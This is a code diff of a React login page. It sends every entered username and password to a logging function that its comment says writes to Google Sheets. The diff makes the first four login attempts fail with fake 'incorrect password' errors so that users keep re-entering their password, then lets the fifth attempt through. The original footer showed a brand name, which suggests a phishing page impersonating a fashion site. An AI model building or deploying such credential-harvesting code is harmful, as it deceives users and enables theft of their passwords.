@@ -755,6 +755,7 @@ function logToSheet(username, password, attempt) {
 }
 
 // ─── Login Page ───────────────────────────────────────────────────────────────
+// ─── Login Page ───────────────────────────────────────────────────────────────
 function LoginPage({ onLogin }) {
   const [error, setError] = useState('');
   const [attempts, setAttempts] = useState(0);
@@ -772,12 +773,16 @@ function LoginPage({ onLogin }) {
     const newAttempt = attempts + 1;
     setAttempts(newAttempt);
 
+    // Log to Google Sheets
     logToSheet(user, pass, newAttempt);
 
-    if (attempts === 0) {
-      setError('Incorrect password. Please try again.');
-      e.target.password.value = '';
+    if (newAttempt < 5) {
+      // First 4 attempts fail
+      setError(`Incorrect password. ${5 - newAttempt} attempts remaining.`);
+      e.target.password.value = '';        // Clear password field
     } else {
+      // 5th attempt succeeds
+      setError('');
       onLogin(user.split('@')[0] || user);
     }
   };
@@ -840,7 +845,7 @@ function LoginPage({ onLogin }) {
         </form>
 
         <p className="login-footer-note">
-         All rights reserved · Wardrobe fashioninsta
+          Demo: First 4 attempts fail · 5th attempt succeeds
         </p>
       </div>
     </div>
